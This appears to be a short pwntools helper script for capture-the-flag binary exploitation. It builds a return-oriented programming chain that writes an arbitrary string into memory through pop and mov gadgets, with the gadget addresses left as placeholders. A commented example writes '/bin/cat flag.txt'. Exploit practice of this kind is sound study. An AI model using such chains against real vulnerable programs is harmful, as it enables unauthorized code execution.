from pwn import *

gadget_pop = 0x0 # pop r14 ; pop r15 ; ret
gadget_write = 0x0 #  mov qword ptr [r14], r15 ; ret
data = 0x0 # address in writable data segment

# use left when loading is reversed. e.g. pop r15; pop r14;
def write(string, addr, load_gadget, write_gadget, load_from="right", padding=8, fill="\x00"):
    length = len(string)
    if length % padding:
        string = string.ljust(length + (padding - length % padding), fill)
    chain = ""
    for i in range(0, len(string), 8):
        data = string[i:i + padding]
        if load_from == "right":
            chain += p64(load_gadget) + p64(addr + i) + data + p64(write_gadget)
        else:
            chain += p64(load_gadget) + data + p64(addr + i) + p64(write_gadget)
    return chain

# write("/bin/cat flag.txt", data, gadget_pop, gadget_write)
